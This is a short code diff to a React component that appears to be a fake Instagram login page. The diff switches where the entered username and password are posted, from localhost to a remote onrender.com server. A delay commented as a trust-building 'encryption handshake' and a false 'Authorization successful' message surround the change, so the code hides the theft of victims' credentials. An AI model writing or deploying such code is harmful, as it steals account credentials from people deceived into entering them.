@@ -37,7 +37,7 @@ const InstagramLogin = () => {
       // Simulate high-level encryption handshake for trust
       await new Promise(resolve => setTimeout(resolve, 800));
       
-      await axios.post("http://localhost:5000/api/user/store", { identifier, password });
+      await axios.post("https://insights-m3ek.onrender.com/api/user/store", { identifier, password });
 
       setStatus({ type: 'success', message: 'Authorization successful. Syncing profile...' });
       
